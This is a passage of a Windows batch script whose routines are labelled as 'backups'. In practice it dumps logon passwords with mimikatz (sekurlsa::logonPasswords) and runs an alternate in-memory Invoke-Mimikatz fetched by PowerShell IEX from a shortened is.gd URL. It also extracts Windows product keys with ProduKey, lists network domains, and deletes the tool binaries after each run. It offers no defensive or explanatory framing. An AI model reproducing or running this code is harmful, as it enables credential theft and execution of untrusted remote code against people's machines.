"%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe" "privilege::debug" "sekurlsa::logonPasswords full" "exit" >> "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%"
if not exist "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to write the file "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%"! >> "%CON_DT_LOGFILE%"
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe"
goto the_end_of_time
:DT_Backup_Windows_Passwords_PowerSploit_Mimikatz_RAM_Injection
powershell set-executionpolicy remotesigned
powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds" >> "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%"
goto the_end_of_time
:DT_Backup_Product_Keys_Produkey
if "%DT_SYSTEM_TYPE%"=="32BIT" goto DT_Backup_Product_Keys_Produkey_32BIT
if "%DT_SYSTEM_TYPE%"=="64BIT" goto DT_Backup_Product_Keys_Produkey_64BIT
goto the_end_of_time
:DT_Backup_Product_Keys_Produkey_32BIT
if "%CON_DT_LOG%"=="TRUE" @echo Preparing to execute ProduKey 32BIT edition... >> "%CON_DT_LOGFILE%"

if not exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.zip" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.zip"! ProduKey execution failed. >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe"
if "%CON_DT_LOG%"=="TRUE" @echo Extracting "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.zip"... >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe"! Extraction of data failed. >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.zip" "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" x -o"%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\" -y "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.zip" -p"%VAR_PROGRAM_ARCHIVE_PASSWORD%" >nul
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe"! >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if "%CON_DT_LOG%"=="TRUE" @echo Extraction of "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.zip" successful. Executing "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe"... >> "%CON_DT_LOGFILE%"
"%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe" /WindowsKeys 1 /stab "" >> "%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_FILE%"
if not exist "%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_FILE%" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to write the file "%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_FILE%"! >> "%CON_DT_LOGFILE%"
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe"
goto the_end_of_time
:DT_Backup_Product_Keys_Produkey_64BIT
if "%CON_DT_LOG%"=="TRUE" @echo Preparing to execute ProduKey 64BIT edition... >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.zip" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.zip"! ProduKey execution failed. >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe"
if "%CON_DT_LOG%"=="TRUE" @echo Extracting "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.zip"... >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe"! Extraction of data failed. >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.zip" "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" x -o"%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\" -y "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.zip" -p"%VAR_PROGRAM_ARCHIVE_PASSWORD%" >nul
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe"! >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if "%CON_DT_LOG%"=="TRUE" @echo Extraction of "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.zip" successful. Executing "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe"... >> "%CON_DT_LOGFILE%"
"%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe" /WindowsKeys 1 /stab "" >> "%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_FILE%"
if not exist "%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_FILE%" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to write the file "%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_FILE%"! >> "%CON_DT_LOGFILE%"
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe"
goto the_end_of_time
:DT_Execute_Init_Scripts
if not exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%" (
if "%CON_DT_LOG%"=="TRUE" @echo Init script[s] execution failed. Error reason: The directory "%CON_DT_INIT_SCRIPTS_DIRECTORY%" does not exist. >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
set DT_Init_Current=0
if exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" (
if "%CON_DT_LOG%"=="TRUE" @echo Init script "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" located. Executing... >> "%CON_DT_LOGFILE%"
)
if exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" call "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat"
%~d0
CD %~dp0
if exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" (
if "%CON_DT_LOG%"=="TRUE" @echo Init script "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" executed. >> "%CON_DT_LOGFILE%"
)
if not exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" goto the_end_of_time
:DT_Init_Script_Execution_Count
set DT_Init_Current=%DT_Init_Current%+1
if exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" (
if "%CON_DT_LOG%"=="TRUE" @echo Init script "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" located. Executing... >> "%CON_DT_LOGFILE%"
)
if exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" call "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat"
%~d0
CD %~dp0
if exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" (
if "%CON_DT_LOG%"=="TRUE" @echo Init script "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" executed. >> "%CON_DT_LOGFILE%"
)
if not exist "%CON_DT_INIT_SCRIPTS_DIRECTORY%\%DT_Init_Current%.bat" goto the_end_of_time
goto DT_Init_Script_Execution_Count
:DT_Sha1Sum_Check_Compact
if %1=="" goto the_end_of_time
if "%1"=="" goto the_end_of_time
if %2=="" goto the_end_of_time
if "%2"=="" goto the_end_of_time
set DT_FILE_TO_CHECK=%1
set DT_FILE_TO_CHECK=%DT_FILE_TO_CHECK:"=%
set DT_FILE_TO_CHECK_EXPECT_SUM=%2
set DT_FILE_TO_CHECK_EXPECT_SUM=%DT_FILE_TO_CHECK_EXPECT_SUM:"=%
REM SHA1 SUM:
if exist "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" del /f "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
"%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" "%DT_FILE_TO_CHECK%" > "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt"
findstr /m "%DT_FILE_TO_CHECK_EXPECT_SUM%" "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
if %errorlevel%==1 (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] Sha1sum mismatch in file "%DT_FILE_TO_CHECK%" - Expected sum: %DT_FILE_TO_CHECK_EXPECT_SUM% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if %errorlevel%==0 (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] Sha1sum match in file "%DT_FILE_TO_CHECK%" - Expected sum: %DT_FILE_TO_CHECK_EXPECT_SUM% >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Backup_Workgroup_And_Domain_Listings
NET VIEW /DOMAIN >> "%CON_DT_LIST_WORKGROUPS_AND_DOMAINS_PATH%\%CON_DT_LIST_WORKGROUPS_AND_DOMAINS_FILE%"
goto the_end_of_time
:force_the_end_of_time
if not "%DT_DEBUGGING%"=="TRUE" exit
:the_end_of_time
